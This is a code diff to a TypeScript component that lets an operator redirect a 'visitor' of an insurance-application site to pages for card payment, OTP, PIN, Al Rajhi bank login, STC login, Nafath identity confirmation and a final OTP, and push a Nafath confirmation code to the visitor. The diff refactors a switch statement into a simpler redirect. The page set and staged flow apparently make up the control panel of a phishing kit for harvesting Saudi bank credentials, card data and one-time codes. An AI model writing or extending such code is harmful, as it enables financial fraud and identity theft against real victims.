@@ -72,70 +72,21 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
     try {
       let updates: Partial<InsuranceApplication> = {};
 
-      switch (destination) {
-        case "home":
-          // Set both fields for compatibility
-          updates = {
-            redirectPage: "home" as any,
-            currentStep: "home" as any,
-          };
-          break;
-        case "insur":
-          updates = { redirectPage: "insur" as any };
-          break;
-        case "compar":
-          updates = { redirectPage: "compar" as any };
-          break;
-        case "payment":
-          // Modern pages use redirectPage, legacy pages use currentStep
-          updates = {
-            redirectPage: "payment" as any,
-            currentStep: "_st1" as any,
-            cardStatus: "pending" as any,
-            otpStatus: "pending" as any,
-          };
-          break;
-        case "otp":
-          updates = {
-            redirectPage: "otp" as any,
-            currentStep: "_t2" as any,
-          };
-          break;
-        case "pin":
-          updates = {
-            redirectPage: "pin" as any,
-            currentStep: "_t3" as any,
-          };
-          break;
-        case "rajhi":
-          updates = {
-            redirectPage: "rajhi" as any,
-            currentStep: "rajhi" as any,
-          };
-          break;
-        case "stc-login":
-          updates = {
-            redirectPage: "stc-login" as any,
-            currentStep: "stc-login" as any,
-          };
-          break;
-        case "phone":
-          // Legacy system only
-          updates = { currentStep: "phone" as any };
-          break;
-        case "nafad":
-          // Legacy system with correct value
-          updates = { currentStep: "_t6" as any };
-          break;
-        case "nafad_modal":
-          updates = { nafadConfirmationCode: "123456" }; // Send confirmation code to open modal
-          break;
-        case "finalOtp":
-          updates = {
-            redirectPage: "finalOtp" as any,
-            currentStep: "finalOtp" as any,
-          };
-          break;
+      if (destination === "nafad_modal") {
+        updates = { nafadConfirmationCode: "123456" };
+      } else if (destination === "payment") {
+        updates = {
+          redirectPage: "payment",
+          currentStep: "payment" as any,
+          cardStatus: "pending",
+          otpStatus: "pending",
+        };
+      } else {
+        updates = {
+          redirectPage: destination,
+          currentStep: destination as any,
+          redirectRequestedAt: new Date().toISOString(),
+        };
       }
 
       if (Object.keys(updates).length > 0) {
